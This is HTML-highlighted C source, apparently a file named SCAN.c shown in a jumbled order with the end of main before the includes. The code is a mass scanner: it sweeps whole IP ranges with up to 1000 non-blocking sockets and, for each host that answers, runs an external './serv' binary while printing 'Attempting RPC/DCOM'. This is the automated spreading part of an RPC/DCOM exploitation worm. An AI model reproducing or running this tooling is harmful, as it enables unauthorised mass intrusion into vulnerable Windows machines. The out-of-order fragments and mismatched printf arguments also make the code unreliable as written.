</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">))</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Invalid c-range.\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> 

</span><span class="sc11">init_sockets</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc11">scantime</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">while</span><span class="sc10">(!</span><span class="sc11">done</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">cc</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">bb</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">aa</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">ns</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">ns</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fcntl</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">F_SETFL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_NONBLOCK</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Unable to set O_NONBLOCK\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d.%d.%d.%d"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">aa</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Invalid IP."</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_CONNECTING</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">dd</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">check_sockets</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_sockets</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">((</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">check_sockets</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">TIMEOUT</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">S_CONNECTING</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">S_CONNECTING</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">EISCONN</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">),</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)-</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EALREADY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EINPROGRESS</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">luck</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">luck</span><span class="sc10">,</span><span class="sc6">"./serv %s"</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">),(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)-</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Attempting RPC/DCOM on %s\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">),</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)-</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">system</span><span class="sc10">(</span><span class="sc11">luck</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Done with %s Next ...\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">err</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Error: %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">S_CONNECTING</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">SCAN</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0">


</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;
</span><span class="sc0">
</span><span class="sc9">#define MAX_SOCKETS 1000
#define TIMEOUT 2
</span><span class="sc0">
</span><span class="sc9">#define S_NONE 0
#define S_CONNECTING 1
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">conn_t</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">status</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">conn_t</span><span class="sc0"> </span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">MAX_SOCKETS</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_sockets</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">check_sockets</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">done</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">aa</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ns</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">scantime</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Usage: %s &lt;a-block&gt; &lt;port&gt; [b-block] [c-block]\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">done</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

